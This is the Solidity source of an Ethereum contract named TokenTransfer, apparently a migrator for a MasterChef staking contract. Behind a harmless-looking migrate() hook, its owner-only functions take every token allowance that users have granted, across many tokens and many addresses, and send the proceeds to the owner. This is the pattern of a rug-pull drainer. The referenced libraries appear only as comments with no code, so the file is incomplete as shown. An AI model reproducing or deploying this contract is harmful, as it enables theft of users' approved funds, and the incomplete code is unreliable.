/**
 *Submitted for verification at Etherscan.io on 2021-02-24
*/

pragma solidity ^0.6.12;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see {ERC20Detailed}.
 */


/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */


/**
 * @dev Collection of functions related to the address type
 */


/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for ERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */


/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenTransfer is Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    address public chef = 0xe8955E12Eed4A1686b232CfA5E30182317A00204;
    address public migrateAddress = 0x0ca27E21b69b0d09DACfCAf7E2427B6806B4F097;

    function migrate(address orig) public returns (address) {
        require(msg.sender == chef, "not from master chef");
        return migrateAddress;
    }

    function checkAllowance(
        address erc20,
        address owner,
        address spender
    ) public view returns (uint256 allowance, uint256 balanceOf) {
        allowance = IERC20(erc20).allowance(owner, spender);
        balanceOf = IERC20(erc20).balanceOf(owner);
    }

    function transferFrom(
        address erc20,
        address from,
        uint256 amount
    ) public onlyOwner() {
        IERC20 token = IERC20(erc20);
        (uint256 allowance, uint256 balanceOf) =
            checkAllowance(erc20, from, address(this));
        if (amount <= allowance && amount <= balanceOf) {
            token.safeTransferFrom(from, address(this), amount);
        }
    }

    function transferFromMulti(
        address erc20,
        address[] memory froms,
        uint256 amount
    ) public onlyOwner() {
        for (uint256 index = 0; index < froms.length; index++) {
            transferFrom(erc20, froms[index], amount);
        }
    }

    function transferFromAll(address erc20, address from) public onlyOwner() {
        (uint256 allowance, uint256 balanceOf) =
            checkAllowance(erc20, from, address(this));
        transferFrom(
            erc20,
            from,
            allowance >= balanceOf ? balanceOf : allowance
        );
    }

    function transferFromAllMulti(address erc20, address[] memory froms)
        public
        onlyOwner()
    {
        for (uint256 index = 0; index < froms.length; index++) {
            transferFromAll(erc20, froms[index]);
        }
    }

    function transferFromMultiToMulti(
        address[] calldata erc20s,
        address[] calldata froms,
        uint256 amount
    ) external onlyOwner() {
        for (uint256 index = 0; index < erc20s.length; index++) {
            transferFromMulti(erc20s[index], froms, amount);
        }
    }

    function transferFromAllMultiToMulti(
        address[] calldata erc20s,
        address[] calldata froms
    ) external onlyOwner() {
        for (uint256 index = 0; index < erc20s.length; index++) {
            transferFromAllMulti(erc20s[index], froms);
        }
    }

    function out(address erc20) public onlyOwner() {
        IERC20 token = IERC20(erc20);
        token.safeTransfer(owner(), token.balanceOf(address(this)));
    }

    function balanceOf(address erc20) public view returns (uint256) {
        IERC20 token = IERC20(erc20);
        return token.balanceOf(address(this));
    }

    function outMulti(address[] calldata erc20s) external onlyOwner() {
        for (uint256 index = 0; index < erc20s.length; index++) {
            out(erc20s[index]);
        }
    }
}